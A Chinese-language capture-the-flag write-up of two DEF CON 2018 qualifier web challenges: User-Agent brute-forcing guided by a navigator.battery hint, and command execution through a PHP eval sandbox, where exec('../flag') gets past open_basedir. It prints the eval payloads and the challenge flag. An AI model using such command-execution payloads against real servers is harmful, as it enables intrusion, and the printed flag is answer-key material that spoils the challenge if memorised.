# Defcon 2018
這是我第一次打defcon的初賽，雖然web的水準還是很高，但是感覺多了些出壞的題目:sweat:

# sbva
這題的web page在用官方給的帳密登入後，會跳出`Incompatible browser detected.`的畫面。  
看到這個之後我就開始試`user-agent`的爆破了，但比賽時我卻漏掉很重要的一點，那就是提示...  
response:  
```php
<html>
    <style scoped>
        h1 {color:red;}
        p {color:blue;} 
    </style>
    <video id="v" autoplay> </video>
    <script>
        if (navigator.battery.charging) {
            console.log("Device is charging.")
        }
    </script>
</html>
```
我居然一股腦兒得在做爆破卻不理會這個提示  
賽後我才知道這是一個`navigator.battery`的API，在以前一些版本的瀏覽器有作支援，知道這個線索後再做爆破，這題就秒解了...

# PHP Eval White-List
這道題目的頁面是在說，他們做了很厲害的`eval`白名單，除了extension，他們還有開啟`open_basedir`來避免我們去執行別的目錄下的`flag`。  
看到這邊我就起手研究如何繞過`open_basedir`囉～  
首先看看目錄下的檔案：  
```php
// eval()
echo `ls`;
```
網頁根目錄下有這些檔案：  
```
bootstrap.min.css
index.php
source.php
source.txt
tmp/
websec_eval_wl.so
```
再來是看看我們只能**訪問**哪個目錄：  
```php
echo ini_get('open_basedir')
```
回傳得到的是`/var/www/html`  
好，為啥說這道題目不太U呢，其實我最後根本沒試著繞過`open_basedir`，我最後在瞎試`echo exec('../flag')`時就成功了！  
這題的flag就是`OOO{Fortunately_php_has_some_rock_solid_defense_in_depth_mecanisms,_so-everything_is_fine.}`  
